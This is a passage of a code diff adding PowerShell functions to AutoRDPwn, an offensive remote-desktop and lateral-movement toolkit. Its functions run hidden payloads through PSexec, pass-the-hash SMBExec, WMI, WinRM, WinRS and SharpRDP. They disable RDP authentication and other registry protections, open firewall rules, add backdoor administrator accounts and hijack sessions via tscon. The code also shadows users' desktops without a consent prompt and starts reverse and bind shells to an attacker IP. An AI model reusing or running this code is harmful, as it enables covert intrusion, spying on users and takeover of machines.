+    $remoteDirectory = 'C:\Windows\Temp\AutoRDPwn_' + [guid]::NewGuid().ToString('N')
+    $scriptPath = Join-Path $remoteDirectory (Split-Path -Leaf $localPath)
+    Copy-ARFileToTarget -LocalPath $localPath -RemotePath $scriptPath | Out-Null
+    try {
+        return Invoke-Command -Session $session -ArgumentList $scriptPath, $Function, $Arguments, $Command -ScriptBlock {
+            param($path, $functionName, $argumentMap, $commandText)
+            Push-Location (Split-Path -Parent $path)
+            try {
+                . $path
+                if ($commandText -ne '') { Invoke-Expression $commandText }
+                elseif ($functionName -ne '') {
+                    $splat = @{}
+                    if ($argumentMap) { foreach ($key in $argumentMap.Keys) { $splat[$key] = $argumentMap[$key] } }
+                    & $functionName @splat
+                }
+            }
+            finally { Pop-Location }
+        } -ErrorAction Stop
+    }
+    finally {
+        try { Invoke-Command -Session $session -ArgumentList $remoteDirectory -ScriptBlock { param($path) Remove-Item -LiteralPath $path -Recurse -Force -ErrorAction SilentlyContinue } -ErrorAction SilentlyContinue } catch { }
+    }
+}
+
+function Invoke-ARTargetBinary {
+    param(
+        [Parameter(Mandatory = $true)][string]$LocalPath,
+        [string[]]$Arguments = @(),
+        [string]$RemoteName = ''
+    )
+    if ([string]::IsNullOrWhiteSpace($RemoteName)) { $RemoteName = Split-Path -Leaf $LocalPath }
+    if (Test-ARIsLocalTarget) {
+        return (& $LocalPath @Arguments 2>&1)
+    }
+    $session = Get-ARTargetSession
+    $remoteDirectory = 'C:\Windows\Temp\AutoRDPwn_' + [guid]::NewGuid().ToString('N')
+    $remotePath = Join-Path $remoteDirectory $RemoteName
+    Copy-ARFileToTarget -LocalPath $LocalPath -RemotePath $remotePath | Out-Null
+    try {
+        return Invoke-Command -Session $session -ArgumentList $remotePath, $Arguments -ScriptBlock {
+            param($path, $binaryArguments)
+            & $path @binaryArguments 2>&1
+        } -ErrorAction Stop
+    }
+    finally {
+        try { Invoke-Command -Session $session -ArgumentList $remoteDirectory -ScriptBlock { param($path) Remove-Item -LiteralPath $path -Recurse -Force -ErrorAction SilentlyContinue } -ErrorAction SilentlyContinue } catch { }
+    }
+}
+
+function Get-ARPayloads {
+    param([switch]$IncludeCreateUser)
+    $payloads = New-Object System.Collections.Generic.List[string]
+    foreach ($name in @('Pwn1', 'Pwn2', 'Pwn3', 'Pwn4')) {
+        $value = Get-ARText $name ''
+        if (-not [string]::IsNullOrWhiteSpace($value)) { $payloads.Add($value) }
+    }
+    if ($IncludeCreateUser -or $script:ARCreateUser) {
+        $value = Get-ARText 'Pwn5' ''
+        if (-not [string]::IsNullOrWhiteSpace($value)) { $payloads.Add($value) }
+    }
+    return $payloads.ToArray()
+}
+
+function Get-ARSessionId {
+    param($Lines, [int]$Fallback = 1)
+    $ids = New-Object System.Collections.Generic.List[int]
+    foreach ($line in @($Lines)) {
+        $text = [string]$line
+        if ($text -match '^\s*>?\s*.*?\s+(\d+)\s+(?:Active|Disc|Conn|Listen|Inact|Start|Down)\b') {
+            $id = [int]$Matches[1]
+            if ($id -gt 0 -and -not $ids.Contains($id)) { $ids.Add($id) }
+        }
+    }
+    if ($ids.Count -gt 0) { return ($ids | Sort-Object | Select-Object -First 1) }
+    return $Fallback
+}
+
+function Install-ARRdpWrap {
+    param([Parameter(Mandatory = $true)]$Session)
+    $scriptPath = Get-ARResourcePath 'Resources\Scripts\Invoke-RDPwrap.ps1'
+    Push-Location $script:ARTools
+    try {
+        . $scriptPath
+        if (-not $RDPWrap) { throw 'RDPWrap payload is empty.' }
+        $directory = New-ARWorkDirectory
+        $msiPath = Join-Path $directory 'Setup.msi'
+        [System.IO.File]::WriteAllBytes($msiPath, $RDPWrap)
+        $remoteDirectory = 'C:\Windows\Temp\AutoRDPwn_' + [guid]::NewGuid().ToString('N')
+        $remoteMsi = Join-Path $remoteDirectory 'Setup.msi'
+        $remoteMsi = Copy-ARFileToTarget -LocalPath $msiPath -RemotePath $remoteMsi
+        $ruleName = Get-ARText 'Pwn6' 'RDP session agent'
+        Invoke-Command -Session $Session -ArgumentList $remoteMsi, $ruleName -ScriptBlock {
+            param($msi, $rule)
+            Start-Process -FilePath 'msiexec.exe' -ArgumentList @('/i', $msi, '/quiet', '/qn', '/norestart') -Wait
+            netsh advfirewall firewall delete rule name="$rule" 2>&1> $null
+            netsh advfirewall firewall add rule name="$rule" dir=in protocol=udp action=allow program="C:\Windows\System32\rdpsa.exe" enable=yes 2>&1> $null
+            netsh advfirewall firewall add rule name="$rule" dir=in protocol=tcp action=allow program="C:\Windows\System32\rdpsa.exe" enable=yes 2>&1> $null
+            attrib +h 'C:\Program Files\RDP Wrapper' 2>&1> $null
+            attrib +h 'C:\Program Files (x86)\RDP Wrapper' 2>&1> $null
+            if (Get-Process msiexec -ErrorAction SilentlyContinue) { Wait-Process -Name msiexec -Timeout 60 -ErrorAction SilentlyContinue }
+            Remove-Item -LiteralPath (Split-Path -Parent $msi) -Recurse -Force -ErrorAction SilentlyContinue
+        } -ErrorAction Stop
+    }
+    finally {
+        Pop-Location
+    }
+}
+
+function Invoke-ARShadowEngine {
+    $target = Get-ARTargetComputer
+    $credential = $script:AROverrideCredential
+    if (-not $credential) { $credential = Get-ARTargetCredential }
+    $session = Get-ARTargetSession
+    $control = $true
+    if ($script:ARShadowPreference -in @('see', 'view', 'ver', 'regarder', 'siehe', 'vedere')) { $control = $false }
+    elseif ($script:ARShadowPreference -in @('control', 'controlar', 'controle', 'kontrolle', 'controllo')) { $control = $true }
+    elseif ([string]$script:ARTarget['Mode'] -eq 'view') { $control = $false }
+
+    Write-ARInfo (Get-ARText 'txt32' 'Changes in the Windows registry made successfully!')
+    $previous = Invoke-Command -Session $session -ErrorAction Stop -ScriptBlock {
+        $terminalServer = 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server'
+        $winstation = 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp'
+        function Get-ARRemoteValue($path, $name) {
+            try {
+                $item = Get-ItemProperty -Path $path -Name $name -ErrorAction Stop
+                return $item.$name
+            }
+            catch { return $null }
+        }
+        $allowRemoteRpc = Get-ARRemoteValue $terminalServer 'AllowRemoteRPC'
+        New-ItemProperty -Path $terminalServer -Name 'AllowRemoteRPC' -Value 1 -PropertyType DWORD -Force | Out-Null
+        New-ItemProperty -Path $terminalServer -Name 'fDenyTSConnections' -Value 0 -PropertyType DWORD -Force | Out-Null
+        New-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\WBEM\CIMOM' -Name 'AllowAnonymousCallback' -Value 1 -PropertyType DWORD -Force | Out-Null
+        New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa' -Name 'DisableRestrictedAdmin' -Value 0 -PropertyType DWORD -Force | Out-Null
+        New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters' -Name 'AutoShareWks' -Value 1 -PropertyType DWORD -Force | Out-Null
+        New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters' -Name 'AutoShareServer' -Value 1 -PropertyType DWORD -Force | Out-Null
+        New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Remote Assistance' -Name 'fAllowToGetHelp' -Value 1 -PropertyType DWORD -Force | Out-Null
+        New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Remote Assistance' -Name 'fAllowFullControl' -Value 1 -PropertyType DWORD -Force | Out-Null
+        New-ItemProperty -Path $winstation -Name 'SecurityLayer' -Value 0 -PropertyType DWORD -Force | Out-Null
+        New-ItemProperty -Path $winstation -Name 'UserAuthentication' -Value 0 -PropertyType DWORD -Force | Out-Null
+        New-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'LocalAccountTokenFilterPolicy' -Value 1 -PropertyType DWORD -Force | Out-Null
+        New-Item -Path 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System\CredSSP\Parameters' -Force | Out-Null
+        New-ItemProperty -Path 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System\CredSSP\Parameters' -Name 'AllowEncryptionOracle' -Value 2 -PropertyType DWORD -Force | Out-Null
+        Enable-NetFirewallRule -Name 'RemoteDesktop-Shadow-In-TCP' -ErrorAction SilentlyContinue
+        if (-not (Get-NetFirewallRule -Name 'AutoRDPwn-TermService-RPC-In' -ErrorAction SilentlyContinue)) {
+            New-NetFirewallRule -Name 'AutoRDPwn-TermService-RPC-In' -DisplayName 'AutoRDPwn TermService RPC' -Direction Inbound -Action Allow -Program 'C:\Windows\System32\svchost.exe' -Service TermService -Protocol TCP -Profile Any -ErrorAction SilentlyContinue | Out-Null
+        }
+        $caption = (Get-CimInstance -ClassName Win32_OperatingSystem -ErrorAction SilentlyContinue).Caption
+        $isServer = $caption -like '*Server*'
+        $sessionId = $null
+        if (-not $isServer) {
+            try { $sessionId = (Get-Process explorer -ErrorAction SilentlyContinue | Sort-Object SessionId | Select-Object -Last 1).SessionId } catch { }
+            if (-not $sessionId) { $sessionId = 1 }
+        }
+        [pscustomobject]@{
+            AllowRemoteRpc = $allowRemoteRpc
+            IsServer = $isServer
+            HostName = $env:COMPUTERNAME
+            SessionId = $sessionId
+            Caption = $caption
+        }
+    }
+
+        $plain = ''
+        if ($credential) { $plain = $credential.GetNetworkCredential().Password }
+        if ($credential -and $plain -ne '') {
+            cmdkey.exe "/add:$target" "/user:$($credential.UserName)" "/pass:$plain" 2>&1> $null
+            if (-not $script:ARCmdKeyTargets.Contains($target)) { $script:ARCmdKeyTargets.Add($target) }
+        }
+        Write-ARInfo ((([string](Get-ARText 'txt33' 'Detecting operating system version on')).TrimEnd()) + ' ' + ([string]$previous.HostName).ToLowerInvariant())
+        if ($null -eq $previous.AllowRemoteRpc -or [int]$previous.AllowRemoteRpc -eq 0) {
+            Write-ARWarn (Get-ARText 'txt86' 'The remote machine needs a reboot to apply the changes, rebooting..')
+            try { Invoke-Command -Session $session -ScriptBlock { Restart-Computer -Force } -ErrorAction SilentlyContinue } catch { }
+            try { Remove-PSSession -Session $session -ErrorAction SilentlyContinue } catch { }
+            $script:ARSession = $null
+            Start-Sleep -Seconds 60
+            $session = $null
+            for ($attempt = 0; $attempt -lt 30; $attempt++) {
+                Start-Sleep -Seconds 3
+                try {
+                    $session = Connect-ARTargetSession -Credential $credential -Force
+                    if ($session) { break }
+                } catch { }
+            }
+            if (-not $session) { throw 'The target did not come back after the reboot.' }
+        }
+
+        if ($previous.IsServer) {
+            try {
+                Invoke-Command -Session $session -ScriptBlock {
+                    (Get-CimInstance -ClassName Win32_TSGeneralSetting -Namespace root\cimv2\terminalservices -Filter "TerminalName='RDP-tcp'").SetUserAuthenticationRequired(0) | Out-Null
+                } -ErrorAction SilentlyContinue | Out-Null
+            } catch { }
+            $query = Invoke-Command -Session $session -ScriptBlock { query session 2>&1 } -ErrorAction SilentlyContinue
+            Show-ARText $query
+            $sessionId = Get-ARSessionId $query 1
+            if (-not $script:ARInvokedFromOption) {
+                $answer = Read-ARValue (Get-ARText 'txt36' 'What session do you want to connect to?') ([string]$sessionId)
+                if ($answer -match '^\d+$') { $sessionId = [int]$answer }
+            }
+        }
+        else {
+            $sessionId = [int]$previous.SessionId
+            if (-not $sessionId) { $sessionId = 1 }
+            try { Install-ARRdpWrap -Session $session }
+            catch { Write-ARWarn ('RDPWrap could not be installed: ' + $_.Exception.Message) }
+        }
+
+        $arguments = @("/v:$target", '/admin')
+        if ($sessionId) {
+            $arguments += "/shadow:$sessionId"
+            $arguments += '/noconsentprompt'
+            if ($control) { $arguments += '/control' }
+        }
+        $arguments += '/f'
+        if ($script:ARNoGui) {
+            Write-Host ('mstsc ' + ($arguments -join ' ')) -ForegroundColor DarkGray
+        }
+        else {
+            Write-ARInfo (Get-ARText 'txt38' 'Starting remote connection!')
+            Start-Process -FilePath 'mstsc.exe' -ArgumentList $arguments | Out-Null
+        }
+        return [pscustomobject]@{ Control = $control; SessionId = $sessionId; FullDesktop = (-not $sessionId) }
+}
+
+
+function Invoke-ARAction {
+    param([Parameter(Mandatory = $true)][string]$Id)
+    $action = Get-ARActionById $Id
+    if (-not $action) {
+        Write-ARError 'Unknown action.'
+        return
+    }
+    Clear-ARScreen
+    Set-ARStatus ($action.Title) 'Info'
+    try {
+        & $action.Handler
+        if ($script:ARStatus['Kind'] -eq 'Info') { Set-ARStatus ($action.Title + ' finished') 'Ok' }
+    }
+    catch {
+        Set-ARStatus $_.Exception.Message 'Error'
+        Write-ARError $_.Exception.Message
+    }
+    if (-not $script:ARInvokedFromOption) {
+        Write-ARBlank
+        Write-Host ' Press any key to return to the menu' -ForegroundColor DarkGray
+        try { $null = [Console]::ReadKey($true) } catch { try { Read-Host | Out-Null } catch { } }
+    }
+}
+
+function Invoke-ARCleanup {
+    if ($script:ARCleanupDone) { return }
+    $script:ARCleanupDone = $true
+    if ($script:ARNoClean) {
+        Close-ARTargetSession
+        Restore-ARDefender
+        $script:AROverrideCredential = $null
+        return
+    }
+    if ($script:ARSession) {
+        try {
+            Invoke-Command -Session $script:ARSession -ScriptBlock {
+                Get-Job -ErrorAction SilentlyContinue | Where-Object { $_.Name -like 'AutoRDPwn_*' } | Stop-Job -ErrorAction SilentlyContinue
+                Get-Job -ErrorAction SilentlyContinue | Where-Object { $_.Name -like 'AutoRDPwn_*' } | Remove-Job -Force -ErrorAction SilentlyContinue
+            } -ErrorAction SilentlyContinue | Out-Null
+        } catch { }
+        foreach ($directory in $script:ARRemoteTempDirs.ToArray()) {
+            try {
+                Invoke-Command -Session $script:ARSession -ArgumentList $directory -ScriptBlock {
+                    param($path)
+                    Remove-Item -LiteralPath $path -Recurse -Force -ErrorAction SilentlyContinue
+                } -ErrorAction SilentlyContinue | Out-Null
+            } catch { }
+        }
+    }
+    if ($script:ARHashUserName -ne '' -and $script:ARSession) {
+        try {
+            Invoke-Command -Session $script:ARSession -ArgumentList $script:ARHashUserName -ScriptBlock {
+                param($name)
+                net user $name /delete 2>&1> $null
+                Remove-Item -LiteralPath (Join-Path 'C:\Users' $name) -Recurse -Force -ErrorAction SilentlyContinue
+                Unregister-ScheduledTask -TaskName 'AutoRDPwn' -Confirm:$false -ErrorAction SilentlyContinue
+            } -ErrorAction SilentlyContinue | Out-Null
+        } catch { }
+    }
+    $script:ARHashUserName = ''
+    foreach ($target in $script:ARCmdKeyTargets.ToArray()) {
+        cmdkey.exe "/delete:$target" 2>&1> $null
+    }
+    $script:ARCmdKeyTargets.Clear()
+    Close-ARTargetSession
+    Restore-ARDefender
+    foreach ($directory in $script:ARWorkDirs.ToArray()) {
+        if (Test-Path -LiteralPath $directory) {
+            Remove-Item -LiteralPath $directory -Recurse -Force -ErrorAction SilentlyContinue
+        }
+    }
+    foreach ($file in $script:ARTemporaryFiles.ToArray()) {
+        if (Test-Path -LiteralPath $file) {
+            Remove-Item -LiteralPath $file -Force -ErrorAction SilentlyContinue
+        }
+    }
+    $script:ARWorkDirs.Clear()
+    $script:ARTemporaryFiles.Clear()
+    $script:ARRemoteTempDirs.Clear()
+    $script:AROverrideCredential = $null
+    try { Set-Location -LiteralPath $script:AROriginalLocation } catch { }
+    Write-ARInfo (Get-ARText 'txt76' 'Cleaning done!')
+}
+
+function Get-ARAttackPayloadCommand {
+    param([Parameter(Mandatory = $true)][string]$Payload)
+    $escaped = $Payload -replace '"', '\"'
+    return 'powershell.exe -windowstyle hidden -Command "' + $escaped + '"'
+}
+
+function Invoke-ARAttackPSexec {
+    $target = Get-ARTargetComputer
+    Import-ARToolScript 'Resources\Scripts\Invoke-PSexec.ps1'
+    $executable = Join-Path $script:ARTools 'psexec.exe'
+    if (-not (Test-Path -LiteralPath $executable)) { throw 'PSexec could not be extracted.' }
+    $user = Get-ARTargetUserName
+    $password = ''
+    if ($user -ne '') { $password = Get-ARPlainPassword }
+    foreach ($payload in @(Get-ARPayloads)) {
+        $arguments = @("\\$target")
+        if ($user -ne '') { $arguments += @('-u', $user, '-p', $password) }
+        $arguments += @('-h', '-d', 'powershell.exe', '-windowstyle', 'hidden', $payload, '-nobanner', '-accepteula')
+        & $executable @arguments 2>&1 | ForEach-Object { Write-Host $_ }
+    }
+    Set-ARStatus 'Payloads started with PSexec' 'Ok'
+    Connect-ARTargetSession | Out-Null
+    Invoke-ARShadowEngine | Out-Null
+}
+
+function Invoke-ARAttackPassTheHash {
+    $target = Get-ARTargetComputer
+    if ([string]::IsNullOrWhiteSpace($script:ARTarget['User'])) {
+        $script:ARTarget['User'] = Read-ARValue 'User'
+    }
+    if ([string]::IsNullOrWhiteSpace($script:ARTarget['Hash'])) {
+        $script:ARTarget['Hash'] = Read-ARValue 'NTLM hash'
+    }
+    $user = [string]$script:ARTarget['User']
+    $hash = [string]$script:ARTarget['Hash']
+    $domain = [string]$script:ARTarget['Domain']
+    Import-ARFunctionScript 'Resources\Scripts\Invoke-SMBExec.ps1'
+    foreach ($payload in @(Get-ARPayloads)) {
+        $command = Get-ARAttackPayloadCommand $payload
+        Invoke-SMBExec -Target $target -Domain $domain -Username $user -Hash $hash -Command $command 2>&1 | ForEach-Object { Write-Host $_ }
+    }
+    $createUser = Get-ARText 'Pwn5' ''
+    if ($createUser -ne '') {
+        Invoke-SMBExec -Target $target -Domain $domain -Username $user -Hash $hash -Command $createUser 2>&1 | ForEach-Object { Write-Host $_ }
+    }
+    $hashUser = 'ARDP_' + [guid]::NewGuid().ToString('N').Substring(0, 8)
+    $createHashUser = 'net user ' + $hashUser + ' AutoRDPwn /add & net localgroup Administrators ' + $hashUser + ' /add'
+    Invoke-SMBExec -Target $target -Domain $domain -Username $user -Hash $hash -Command $createHashUser 2>&1 | ForEach-Object { Write-Host $_ }
+    $script:ARHashUserName = $hashUser
+    $secure = ConvertTo-SecureString -String 'AutoRDPwn' -AsPlainText -Force
+    $script:AROverrideCredential = New-Object System.Management.Automation.PSCredential($hashUser, $secure)
+    Start-Sleep -Seconds 2
+    try {
+        Connect-ARTargetSession -Force | Out-Null
+        Invoke-ARShadowEngine | Out-Null
+    }
+    finally {
+        $script:AROverrideCredential = $null
+    }
+}
+
+function Invoke-ARAttackWmi {
+    $target = Get-ARTargetComputer
+    $credential = Get-ARTargetCredential
+    $parameters = @{ ComputerName = $target; ErrorAction = 'Stop' }
+    if ($credential) { $parameters['Credential'] = $credential }
+    $cimSession = New-CimSession @parameters
+    try {
+        foreach ($payload in @(Get-ARPayloads)) {
+            $command = Get-ARAttackPayloadCommand $payload
+            $result = Invoke-CimMethod -CimSession $cimSession -ClassName Win32_Process -MethodName Create -Arguments @{ CommandLine = $command } -ErrorAction Stop
+            if ($result.ReturnValue -ne 0) {
+                Write-ARWarn ('WMI process creation returned ' + $result.ReturnValue)
+            }
+        }
+    }
+    finally { Remove-CimSession -CimSession $cimSession -ErrorAction SilentlyContinue }
+    Set-ARStatus 'Payloads started with WMI' 'Ok'
+    Connect-ARTargetSession | Out-Null
+    Invoke-ARShadowEngine | Out-Null
+}
+
+function Invoke-ARAttackWinRm {
+    $target = Get-ARTargetComputer
+    $credential = Get-ARTargetCredential
+    foreach ($payload in @(Get-ARPayloads)) {
+        $parameters = @{
+            ComputerName = $target
+            ScriptBlock = { param($command) & powershell.exe -WindowStyle Hidden -Command $command }
+            ArgumentList = @($payload)
+            ErrorAction = 'Stop'
+        }
+        if ($credential) {
+            $parameters['Credential'] = $credential
+            $parameters['Authentication'] = 'Negotiate'
+        }
+        Invoke-Command @parameters | Out-Null
+    }
+    Set-ARStatus 'Payloads started with WinRM' 'Ok'
+    Connect-ARTargetSession -Force | Out-Null
+    Invoke-ARShadowEngine | Out-Null
+}
+
+function Invoke-ARAttackWinRs {
+    $target = Get-ARTargetComputer
+    $user = Get-ARTargetUserName
+    $password = ''
+    if ($user -ne '') { $password = Get-ARPlainPassword }
+    foreach ($payload in @(Get-ARPayloads)) {
+        $command = Get-ARAttackPayloadCommand $payload
+        $arguments = @("/r:$target")
+        if ($user -ne '') { $arguments += @("/u:$user", "/p:$password") }
+        $arguments += @('/noecho', '/noprofile', '/allowdelegate', $command)
+        & winrs.exe @arguments 2>&1 | ForEach-Object { Write-Host $_ }
+        Start-Sleep -Milliseconds 600
+    }
+    Set-ARStatus 'Payloads started with WinRS' 'Ok'
+    Connect-ARTargetSession | Out-Null
+    Invoke-ARShadowEngine | Out-Null
+}
+
+function Invoke-ARAttackTscon {
+    if (-not (Test-ARIsAdmin)) { throw 'Administrator privileges are required for TSCon.' }
+    $query = & query.exe session 2>&1
+    Show-ARText $query
+    $sessionId = Get-ARSessionId $query 1
+    if (-not $script:ARInvokedFromOption) {
+        $answer = Read-ARValue 'Session ID' ([string]$sessionId)
+        if ($answer -match '^\d+$') { $sessionId = [int]$answer }
+    }
+    $taskName = 'AutoRDPwnTscon' + [guid]::NewGuid().ToString('N').Substring(0, 8)
+    $action = New-ScheduledTaskAction -Execute (Join-Path $env:SystemRoot 'System32\tscon.exe') -Argument ([string]$sessionId)
+    $principal = New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest
+    try {
+        Register-ScheduledTask -TaskName $taskName -Action $action -Principal $principal -Force | Out-Null
+        Start-ScheduledTask -TaskName $taskName -ErrorAction Stop
+        Start-Sleep -Seconds 2
+    }
+    finally {
+        Unregister-ScheduledTask -TaskName $taskName -Confirm:$false -ErrorAction SilentlyContinue
+    }
+    Set-ARStatus ('Session ' + $sessionId + ' hijacked') 'Ok'
+}
+
+function Invoke-ARAttackRdp {
+    $target = Get-ARTargetComputer
+    Import-ARToolScript 'Resources\Scripts\Invoke-SharpRDP.ps1'
+    $executable = Join-Path $script:ARTools 'SharpRDP.exe'
+    if (-not (Test-Path -LiteralPath $executable)) { throw 'SharpRDP could not be extracted.' }
+    $user = Get-ARTargetUserName
+    $password = ''
+    if ($user -ne '') { $password = Get-ARPlainPassword }
+    foreach ($payload in @(Get-ARPayloads)) {
+        $command = Get-ARAttackPayloadCommand $payload
+        $arguments = @("computername=$target")
+        if ($user -ne '') { $arguments += @("username=$user", "password=$password") }
+        $arguments += "command=$command"
+        & $executable @arguments 2>&1 | ForEach-Object { Write-Host $_ }
+    }
+    Set-ARStatus 'Payloads started with SharpRDP' 'Ok'
+    Connect-ARTargetSession | Out-Null
+    Invoke-ARShadowEngine | Out-Null
+}
+
+function Invoke-ARAttackQuickScreen {
+    $target = Get-ARTargetComputer
+    if ([string]::IsNullOrWhiteSpace($script:ARTarget['User'])) {
+        if ($script:ARInvokedFromOption) { throw 'Quick Screen requires a target user.' }
+        $script:ARTarget['User'] = Read-ARValue 'Target user' $env:USERNAME
+    }
+    $password = Get-ARPlainPassword
+    $attacker = [string]$script:ARTarget['AttackerIP']
+    if ([string]::IsNullOrWhiteSpace($attacker)) {
+        if ($script:ARInvokedFromOption) { throw 'Quick Screen requires the attacker IP.' }
+        $attacker = Read-ARValue (Get-ARText 'txt123' 'Your IP for the reverse connection')
+    }
+    $viewOnly = ([string]$script:ARTarget['Mode'] -eq 'view')
+    $null = Get-ARResourcePath 'Resources\Scripts\Invoke-VNCViewer.ps1'
+    $null = Get-ARResourcePath 'Resources\Scripts\Invoke-VNCServer.ps1'
+    Import-ARFunctionScript 'Resources\Scripts\Invoke-StealthScreen.ps1'
+    Invoke-StealthScreen -Target $target -User ([string]$script:ARTarget['User']) -Pass $password -Mode view -AttackerIP $attacker -Port 5500 -ViewOnly:$viewOnly
+    Set-ARStatus 'Quick Screen finished' 'Ok'
+}
+
+function Invoke-ARModulePipeShell {
+    $target = Get-ARTargetComputer
+    $scriptPath = Get-ARResourcePath 'Resources\Scripts\Invoke-PipeShell.ps1'
+    if (Test-ARIsLocalTarget) {
+        Start-Job -Name ('AutoRDPwn_' + [guid]::NewGuid().ToString('N')) -ScriptBlock {
+            param($path)
+            . $path
+            Invoke-PipeShell -mode server -aeskey AutoRDPwn_AESKey -server localhost -Pipe 'NamedPipeStream'
+        } -ArgumentList $scriptPath | Out-Null
+    }
+    else {
+        $session = Get-ARTargetSession
+        $remoteDirectory = 'C:\Windows\Temp\AutoRDPwnPipe_' + [guid]::NewGuid().ToString('N')
+        $remoteScript = Join-Path $remoteDirectory 'Invoke-PipeShell.ps1'
+        Copy-ARFileToTarget -LocalPath $scriptPath -RemotePath $remoteScript | Out-Null
+        $script:ARRemoteTempDirs.Add($remoteDirectory)
+        Invoke-Command -Session $session -ArgumentList $remoteScript -ScriptBlock {
+            param($path)
+            Start-Job -Name ('AutoRDPwn_' + [guid]::NewGuid().ToString('N')) -ScriptBlock {
+                param($script)
+                . $script
+                Invoke-PipeShell -mode server -aeskey AutoRDPwn_AESKey -server localhost -Pipe 'NamedPipeStream'
+            } -ArgumentList $path | Out-Null
+        } -ErrorAction Stop | Out-Null
+    }
+    Import-ARFunctionScript 'Resources\Scripts\Invoke-PipeShell.ps1'
+    Write-ARInfo 'Named pipe server started on the target.'
+    Invoke-PipeShell -mode client -server $target -aeskey AutoRDPwn_AESKey -i -pipe 'NamedPipeStream' -timeout 120
+    Set-ARStatus 'Named pipe shell closed' 'Ok'
+}
+
+function Invoke-ARModuleWinRsConsole {
+    $target = Get-ARTargetComputer
+    $user = Get-ARTargetUserName
+    $arguments = @("/r:$target")
+    if ($user -ne '') { $arguments += @("/u:$user", "/p:$(Get-ARPlainPassword)") }
+    $arguments += @('/noecho', '/noprofile', '/allowdelegate', 'cmd.exe')
+    Write-ARInfo 'Opening a WinRS console. Type exit to close it.'
+    & winrs.exe @arguments
+    Set-ARStatus 'WinRS console closed' 'Ok'
+}
+
+function Invoke-ARModuleHttpRevShell {
+    $target = Get-ARTargetComputer
+    $ip = [string]$script:ARTarget['AttackerIP']
+    if ([string]::IsNullOrWhiteSpace($ip)) {
+        if ($script:ARInvokedFromOption) { throw 'The attacker IP is required.' }
+        $ip = Read-ARValue (Get-ARText 'txt54' 'Enter the remote IP')
+    }
+    $port = Read-ARValue (Get-ARText 'txt43' 'Enter the remote port') '8080'
+    $scriptPath = Get-ARResourcePath 'Resources\Scripts\Invoke-WebRev.ps1'
+    Push-Location $script:ARTools
+    try { . $scriptPath; $encoded = $webrev64 } finally { Pop-Location }
+    if (-not $encoded) { throw 'The HTTP reverse shell payload is empty.' }
+    if (Test-ARIsLocalTarget) {
+        Start-Job -Name ('AutoRDPwn_' + [guid]::NewGuid().ToString('N')) -ScriptBlock {
+            param($data, $address, $listenPort)
+            $source = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($data))
+            . ([scriptblock]::Create($source))
+            Invoke-WebRev -ip $address -port $listenPort
+        } -ArgumentList $encoded, $ip, $port | Out-Null
+    }
+    else {
+        $session = Get-ARTargetSession
+        Invoke-Command -Session $session -ArgumentList $encoded, $ip, $port -ScriptBlock {
+            param($data, $address, $listenPort)
+            Start-Job -Name ('AutoRDPwn_' + [guid]::NewGuid().ToString('N')) -ScriptBlock {
+                param($payload, $remoteAddress, $remotePort)
+                $source = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($payload))
+                . ([scriptblock]::Create($source))
+                Invoke-WebRev -ip $remoteAddress -port $remotePort
+            } -ArgumentList $payload, $address, $listenPort | Out-Null
+        } -ErrorAction Stop | Out-Null
+    }
+    Import-ARToolScript 'Resources\Scripts\Invoke-RevShellServer.ps1'
+    $server = Join-Path $script:ARTools 'server.exe'
+    if (-not (Test-Path -LiteralPath $server)) { throw 'The reverse shell server could not be extracted.' }
+    Write-ARInfo ('Starting HTTP reverse shell server on ' + $ip + ':' + $port + ' (Ctrl+C stops it).')
+    & $server $ip $port
+    Set-ARStatus 'HTTP reverse shell server stopped' 'Ok'
+}
+
+function Invoke-ARModuleNetcatDirect {
+    $target = Get-ARTargetComputer
+    $port = Read-ARValue (Get-ARText 'txt53' 'Enter the port to listen to')
+    $scriptPath = Get-ARResourcePath 'Resources\Scripts\Invoke-PowerShellTcp.ps1'
+    if (Test-ARIsLocalTarget) {
+        Start-Job -Name ('AutoRDPwn_' + [guid]::NewGuid().ToString('N')) -ScriptBlock {
+            param($path, $listenPort)
+            . $path
+            Invoke-PowerShellTcp -Bind -Port $listenPort
+        } -ArgumentList $scriptPath, ([int]$port) | Out-Null
+    }
+    else {
+        $session = Get-ARTargetSession
+        $remoteDirectory = 'C:\Windows\Temp\AutoRDPwnNetcat_' + [guid]::NewGuid().ToString('N')
+        $remoteScript = Join-Path $remoteDirectory 'Invoke-PowerShellTcp.ps1'
+        Copy-ARFileToTarget -LocalPath $scriptPath -RemotePath $remoteScript | Out-Null
+        $script:ARRemoteTempDirs.Add($remoteDirectory)
+        Invoke-Command -Session $session -ArgumentList $remoteScript, ([int]$port) -ScriptBlock {
+            param($path, $listenPort)
+            netsh advfirewall firewall delete rule name="Powershell Remote Control Application" 2>&1> $null
+            netsh advfirewall firewall add rule name="Powershell Remote Control Application" dir=in action=allow protocol=TCP localport=$listenPort 2>&1> $null
+            Start-Job -Name ('AutoRDPwn_' + [guid]::NewGuid().ToString('N')) -ScriptBlock {
+                param($script, $localPort)
+                . $script
+                Invoke-PowerShellTcp -Bind -Port $localPort
+            } -ArgumentList $path, $listenPort | Out-Null
+        } -ErrorAction Stop | Out-Null
+    }
+    Write-Host '----------------------------------------------------------------------' -ForegroundColor Gray
+    Write-Host ('Netcat direct connection --> ') -NoNewline -ForegroundColor Green
+    Write-Host ('nc ' + $target + ' ' + $port) -ForegroundColor Blue
+    Write-Host '----------------------------------------------------------------------' -ForegroundColor Gray
+    Set-ARStatus ('Listener started on ' + $target + ':' + $port) 'Ok'
+}
+
+function Invoke-ARModuleNetcatReverse {
+    $target = Get-ARTargetComputer
+    $ip = [string]$script:ARTarget['AttackerIP']
